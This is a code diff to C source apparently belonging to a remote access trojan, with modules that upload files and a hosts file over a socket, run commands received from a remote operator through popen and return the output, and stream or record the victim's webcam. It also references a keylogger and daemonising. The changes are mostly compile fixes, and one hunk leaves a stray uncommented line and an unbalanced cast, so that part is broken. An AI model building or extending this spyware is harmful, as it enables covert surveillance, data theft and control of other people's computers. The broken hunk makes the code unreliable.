@@ -71,8 +71,6 @@ int main(int argc, char*argv[])
         return 0;
     }
 
-
-
     //daemonize();
 
     //ubuntu16_keylogger_init();
@@ -112,7 +110,7 @@ void dispatch_modules(char *argv[])
     long dataRead = 0;
     long totalSend = 0;
     long file_size = 0;
-    char caractereLu = 0;
+    int caractereLu = 0;
     int i = 0;
 
     char buffer[MAXDATASIZE] = "";
@@ -121,7 +119,7 @@ void dispatch_modules(char *argv[])
     pthread_t thread_downloader = 0;
     pthread_t thread_hosts_downloader = 0;
 
-    pthread_t stream_desktop = 0;
+    //pthread_t stream_desktop = 0;
     pthread_t stream_webcam_thread = 0;
     pthread_t record_webcam_thread = 0;
 
@@ -225,7 +223,7 @@ void dispatch_modules(char *argv[])
 
             while((caractereLu = fgetc(log_file)) != EOF)
             {
-                buffer[i] = caractereLu;
+                buffer[i] = (char)caractereLu;
                 i++;
             }
 
@@ -349,7 +347,7 @@ void dispatch_modules(char *argv[])
         {
             printf("\t\tSTREAM THE WEBCAM....\n");
 
-            if(pthread_create(&stream_webcam_thread, NULL, (void*)execute_watch_cmd, NULL) == -1)
+            if(pthread_create(&stream_webcam_thread, NULL, (void*(*)(void*))execute_watch_cmd, NULL) == -1)
             {
                 error("pthread_create() stream_webcam_thread", "dispatch_modules()");
                 exit(-1);
@@ -371,8 +369,8 @@ void dispatch_modules(char *argv[])
         {
             printf("\t\tSTREAMING STARTED....\n");
 
-            /** Call the thread that will execute the stream command
-            if(pthread_create(&stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
+             Call the thread that will execute the stream command
+            if(pthread_create(&stream_desktop, NULL, (void*(*)(void*)execute_watch_cmd, NULL) == -1)
             {
                 error("pthread_create() execute_watch_cmd", "dispatch_modules()");
                 exit(-1);
@@ -393,7 +391,7 @@ void dispatch_modules(char *argv[])
             printf("\t\tRECORD WEBCAM STARTED....\n");
 
             /** Call the thread that will execute the stream command **/
-            if(pthread_create(&record_webcam_thread, NULL, (void*)record_webcam, NULL) == -1)
+            if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))record_webcam, NULL) == -1)
             {
                 error("pthread_create() record_webcam_thread", "dispatch_modules()");
                 exit(-1);
@@ -583,14 +581,14 @@ void *send_dowloaded_file()
     if(recv(csock, (char*)&len_file_path, sizeof(len_file_path), 0) == -1)
     {
         error("recv() len_file_path", "send_dowloaded_file()");
-        return;
+        pthread_exit(NULL);
     }
 
     file_path = malloc(len_file_path * sizeof(char));
     if(file_path == NULL)
     {
         error("malloc() file_path", "send_dowloaded_file()");
-        return;
+        pthread_exit(NULL);
     }
 
     printf("len path = %ld\n\n", len_file_path);
@@ -598,7 +596,7 @@ void *send_dowloaded_file()
     if(recv(csock, file_path, len_file_path, 0) == -1)
     {
         error("recv() file_path", "send_dowloaded_file()");
-        return;
+        pthread_exit(NULL);
     }
 
     printf("path = %s\n", file_path);
@@ -610,14 +608,14 @@ void *send_dowloaded_file()
     if(S_ISDIR(fichier->st_mode) == 1)
     {
         free(file_path);
-        return;
+        pthread_exit(NULL);
     }
 
     on_download = fopen(file_path, "rb");
     if(on_download == NULL)
     {
         error("fopen() on_download", "send_dowloaded_file()");
-        return;
+        pthread_exit(NULL);
     }
 
     fseek(on_download, 0, SEEK_END);
@@ -628,7 +626,7 @@ void *send_dowloaded_file()
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
     {
         error("send() file_size", "send_dowloaded_file()");
-        return;
+        pthread_exit(NULL);
 
     }
 
@@ -640,7 +638,7 @@ void *send_dowloaded_file()
         error("malloc() buffer", "send_dowloaded_file()");
         free(file_path);
         fclose(on_download);
-        return;
+        pthread_exit(NULL);
     }
 
     do
@@ -649,7 +647,7 @@ void *send_dowloaded_file()
         if(dataRead < 0)
         {
             perror("fread ");
-            return;
+            pthread_exit(NULL);
         }
 
         dataSend = send(csock, buffer, file_size, 0);
@@ -657,7 +655,7 @@ void *send_dowloaded_file()
         if(dataSend < 0)
         {
             perror("send() ");
-            return;
+            pthread_exit(NULL);
         }
 
         totalSend += dataSend;
@@ -691,7 +689,7 @@ void *send_hosts_file()
 
     if(send(csock, (char*)&len_hosts_path, sizeof(len_hosts_path), 0) == -1)
     {
-        error("send() len_hosts_path", "dispatch_modules()");
+        error("send() len_hosts_path", "send_hosts_file()");
         return 0;
     }
 
@@ -699,7 +697,7 @@ void *send_hosts_file()
 
     if(send(csock, file_path, len_hosts_path, 0) == -1)
     {
-        error("recv() file_path", "dispatch_modules()");
+        error("recv() file_path", "send_hosts_file()");
         return 0;
     }
 
@@ -708,7 +706,7 @@ void *send_hosts_file()
     hosts_download = fopen(file_path, "rb");
     if(hosts_download == NULL)
     {
-        error("fopen() hosts_download", "dispatch_modules()");
+        error("fopen() hosts_download", "send_hosts_file()");
         return 0;
     }
 
@@ -719,7 +717,7 @@ void *send_hosts_file()
     /** Envoie de la taille du fichier txt **/
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
     {
-        error("send() file_size", "dispatch_modules()");
+        error("send() file_size", "send_hosts_file()");
         return 0;
     }
 
@@ -762,7 +760,7 @@ void *start_remote_shell(char *argv[])
     pid_t the_son = 0;
     char *shell = NULL;
 
-    FILE *pipe[2] = {NULL};
+    FILE *pipe = NULL;
 
     char buffer[BUFSIZ]= "";
     char buffer_cmd[MAXDATASIZE] = "";
@@ -777,21 +775,21 @@ void *start_remote_shell(char *argv[])
     if(ret < 0)
     {
         error("send() connected_msg_len", "start_remote_shell()");
-        return;
+        pthread_exit(NULL);
     }
 
     ret = send(csock, connected_msg, connected_msg_len, 0);
     if(ret < 0)
     {
         error("send() connected_msg", "start_remote_shell()");
-        return;
+        pthread_exit(NULL);
     }
 
     the_son = fork();
     if(the_son < 0)
     {
         error("fork() the_son", "start_remote_shell()");
-        return;
+        pthread_exit(NULL);
     }
 
     if(the_son == 0)
@@ -801,13 +799,13 @@ void *start_remote_shell(char *argv[])
         if(shell == NULL)
         {
             error("getenv() shell", "start_remote_shell()");
-            return;
+            pthread_exit(NULL);
         }
 
         if(execv(shell, &argv[0]) == -1)
         {
             error("execv() shell", "start_remote_shell()");
-            return;
+            pthread_exit(NULL);
         }
     }
 
@@ -818,7 +816,7 @@ void *start_remote_shell(char *argv[])
             if(recv(csock, (char*)&data_len, sizeof(data_len), 0) == -1)
             {
                 error("recv() data_len", "start_remote_shell()");
-                return;
+                pthread_exit(NULL);
             }
 
             /* Receive the command */
@@ -826,7 +824,7 @@ void *start_remote_shell(char *argv[])
             if (ret < 0)
             {
                 error("recv() buffer", "start_remote_shell()");
-                return;
+                pthread_exit(NULL);
             }
 
             buffer[data_len - 1] = '\0';
@@ -840,55 +838,40 @@ void *start_remote_shell(char *argv[])
                 pthread_exit(NULL);
             }
 
-            /*
-            pipe[0] = popen(buffer, "w");
-            if(pipe[0] == NULL)
-            {
-                error("popen() pipe[0]", "start_remote_shell()");
-                return;
-            }
-            */
-
             /* Send command results */
-            pipe[1] =  popen(buffer, "r");
-            if(pipe[1] == NULL)
+            pipe =  popen(buffer, "r");
+            if(pipe == NULL)
             {
-                error("popen() pipe[1]", "start_remote_shell()");
-                return;
+                error("popen() pipe", "start_remote_shell()");
+                pthread_exit(NULL);
             }
 
-            ret = fread(buffer_cmd, MAXDATASIZE, sizeof(char), pipe[1]);
+            ret = fread(buffer_cmd, MAXDATASIZE, sizeof(char), pipe);
             if(ret < 0)
             {
 
                 error("fread() buffer_cmd", "start_remote_shell()");
-                return;
+                pthread_exit(NULL);
             }
 
-            if(send(csock, buffer_cmd, BUFSIZ, 0) == SOCKET_ERROR)
+            if(send(csock, buffer_cmd, MAXDATASIZE, 0) == SOCKET_ERROR) // BUFSIZE
             {
                 error("send() buffer_cmd", "start_remote_shell()");
-                return;
+                pthread_exit(NULL);
             }
 
             memset(buffer_cmd, 0, MAXDATASIZE);
             memset(buffer, 0, BUFSIZ);
 
-            /*
-            if(pclose(pipe[0]) == -1)
-            {
-                error("pclose() pipe[0]", "start_remote_shell()");
-                return;
-            }
-            */
-
-            if(pclose(pipe[1]) == -1)
+            if(pclose(pipe) == -1)
             {
                 error("pclose() pipe[1]", "start_remote_shell()");
-                return;
+                pthread_exit(NULL);
             }
         }
     }
+
+    pthread_exit(NULL);
 }
 
 
@@ -1028,12 +1011,6 @@ void record_webcam()
     char *buffer = NULL;
 
     FILE *pipe = NULL;
-
-    GstElement *pipeline;
-    GstBus *bus;
-    GstStateChangeReturn ret;
-    GMainLoop *main_loop;
-    CustomData data;
 
     if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
     {
